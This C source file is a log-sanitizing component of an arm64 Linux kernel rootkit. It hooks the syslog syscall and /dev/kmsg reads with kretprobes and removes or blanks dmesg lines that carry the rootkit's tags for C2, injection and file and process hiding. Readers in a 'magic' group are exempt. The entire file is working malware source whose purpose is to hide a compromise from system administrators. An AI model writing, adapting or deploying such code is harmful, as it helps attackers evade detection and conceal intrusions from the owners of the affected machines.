/*
 * log_sanitize.c: filter rootkit messages from dmesg output
 * kretprobe on _Arm64_sys_syslog and devkmsg_read
 * 
 * __arm64_sys_syslog  -+ covers dmesg --syslog and klogctl()
 * devkmsg_read        -+ covers default dmesg (reads /dev/kmsg)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <asm/ptrace.h>

#include "rootkit.h"

static const char *blacklist[] = {
	"[rootkit]", "[C2]", "[inject]",
	"[file_hide]", "[proc_hide]", "[log_sanitize]","[symlink-block]" ,
	"vuln_rw:",
};

/* ---- shared per-instance data ------------------------------------------ */

struct log_sanitize_data {
	char __user *buf;
	bool         active;
};

/* syslog syscall hook                                                       */

static int syslog_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct pt_regs *inner = (struct pt_regs *)regs->regs[0];
	struct log_sanitize_data *data = (struct log_sanitize_data *)ri->data;
	int type = (int)inner->regs[0];

	data->active = false;
	/* only READ (2), READ_ALL (3), READ_CLEAR (4) return a user buffer */
	if (type != 2 && type != 3 && type != 4)
		return 0;
	if (caller_has_magic_gid())
		return 0;

	data->buf    = (char __user *)inner->regs[1];
	data->active = true;
	return 0;
}

static int syslog_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct log_sanitize_data *data = (struct log_sanitize_data *)ri->data;
	int total = (int)regs_return_value(regs);
	char *kbuf, *line, *end, *buf_end;
	size_t i;

	if (!data->active || total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_ATOMIC);
	if (!kbuf)
		return 0;
	if (copy_from_user(kbuf, data->buf, total)) {
		kfree(kbuf);
		return 0;
	}

	line    = kbuf;
	buf_end = kbuf + total;

	while (line < buf_end) {
		end = memchr(line, '\n', buf_end - line);
		size_t linelen = end ? (size_t)(end - line + 1)
				     : (size_t)(buf_end - line);
		bool match = false;

		for (i = 0; i < ARRAY_SIZE(blacklist); i++) {
			if (strnstr(line, blacklist[i], linelen)) {
				match = true;
				break;
			}
		}

		if (match) {
			memmove(line, line + linelen, buf_end - (line + linelen));
			buf_end -= linelen;
			total   -= linelen;
		} else {
			line += linelen;
		}
	}

	if (copy_to_user(data->buf, kbuf, total)) {
		kfree(kbuf);
		return 0;
	}
	
	regs->regs[0] = total;

	kfree(kbuf);
	return 0;
}

static struct kretprobe syslog_krp = {
	.handler        = syslog_return,
	.entry_handler  = syslog_entry,
	.data_size      = sizeof(struct log_sanitize_data),
	.maxactive      = 4,
	.kp.symbol_name = "__arm64_sys_syslog",
};

/* devkmsg_read hook (/dev/kmsg — default dmesg path)                       */

static int devkmsg_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct log_sanitize_data *data = (struct log_sanitize_data *)ri->data;

	data->active = false;
	if (caller_has_magic_gid())
		return 0;

	/* devkmsg_read is a plain kernel fn — args directly in regs */
	data->buf    = (char __user *)regs->regs[1];
	data->active = true;
	return 0;
}

static int devkmsg_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct log_sanitize_data *data = (struct log_sanitize_data *)ri->data;
	ssize_t total = (ssize_t)regs_return_value(regs);
	char *kbuf, *semi, *msg_end;
	size_t msglen, i;

	if (!data->active || total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_ATOMIC);
	if (!kbuf)
		return 0;
	if (copy_from_user(kbuf, data->buf, total)) {
		kfree(kbuf);
		return 0;
	}

	/* record format: "priority,seq,timestamp,flags;message text\n" */
	semi = memchr(kbuf, ';', total);
	if (!semi)
		goto out;
	semi++;  /* message starts after ';' */

	msg_end = memchr(semi, '\n', kbuf + total - semi);
	msglen  = msg_end ? (size_t)(msg_end - semi)
			  : (size_t)(kbuf + total - semi);

	for (i = 0; i < ARRAY_SIZE(blacklist); i++) {
		if (strnstr(semi, blacklist[i], msglen)) {
			memset(semi, ' ', msglen);
			if (copy_to_user(data->buf, kbuf, total))
				goto out;
			break;
		}
	}

out:
	kfree(kbuf);
	return 0;
}

static struct kretprobe devkmsg_krp = {
	.handler        = devkmsg_return,
	.entry_handler  = devkmsg_entry,
	.data_size      = sizeof(struct log_sanitize_data),
	.maxactive      = 4,
	.kp.symbol_name = "devkmsg_read",
};

/* state tracking */
static bool active;

/* public interface,    init / exit                                 */

int log_sanitize_init(void)
{
	int ret;

	ret = register_kretprobe(&syslog_krp);
	if (ret < 0)
		pr_warn("[log_sanitize] syslog hook unavailable (%d), skipping\n", ret);

	ret = register_kretprobe(&devkmsg_krp);
	if (ret < 0) {
		pr_err("[log_sanitize] failed to register devkmsg kretprobe: %d\n", ret);
		unregister_kretprobe(&syslog_krp);
		return ret;
	}

	active = true;
	pr_info("[log_sanitize] registered\n");
	return 0;
}

void log_sanitize_exit(void)
{
	unregister_kretprobe(&devkmsg_krp);
	unregister_kretprobe(&syslog_krp);
	active = false;
	pr_info("[log_sanitize] unregistered\n");
}

int log_sanitize_enable(void)
{
	memset(&syslog_krp.kp, 0, sizeof(syslog_krp.kp));
	syslog_krp.kp.symbol_name = "__arm64_sys_syslog";
	memset(&devkmsg_krp.kp, 0, sizeof(devkmsg_krp.kp));
	devkmsg_krp.kp.symbol_name = "devkmsg_read";
	return log_sanitize_init();
}

void log_sanitize_disable(void)
{
	log_sanitize_exit();
}

bool log_sanitize_is_active(void)
{
	return active;
}
